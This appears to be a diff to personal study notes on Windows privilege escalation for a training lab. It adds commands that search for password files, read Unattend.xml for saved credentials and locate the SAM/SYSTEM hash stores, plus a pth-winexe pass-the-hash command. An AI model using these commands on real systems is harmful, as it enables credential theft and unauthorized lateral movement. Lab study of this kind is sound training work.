@@ -237,4 +237,19 @@ Recursively search file with pass in the name, or ending: ``` > dir /s *pass* ==
 
 Recursively search for files that contains the word "password" with such endings ```> findstr /si password *xml *.ini *.txt```
 
+# Task 10 Passwords - Saved Creds
+
 ```C:\PrivEsc>type C:\Windows\Panther\Unattend.xml```
+
+# SAM 
+Windows stores password hashes in the Security Account Manager. The hashes are encryptedwith a key which can be found in the file named SYSTEM. 
+
+SAM/SYSTEM Locations C:\Windows\System32\config directory. 
+
+# Pass the Hash 
+
+``` pth-winexe -U 'admin%hash' //10.201.86.23 cmd.exe ```
+
+Resource:
+1. https://www.kali.org/tools/passing-the-hash/
+2. https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
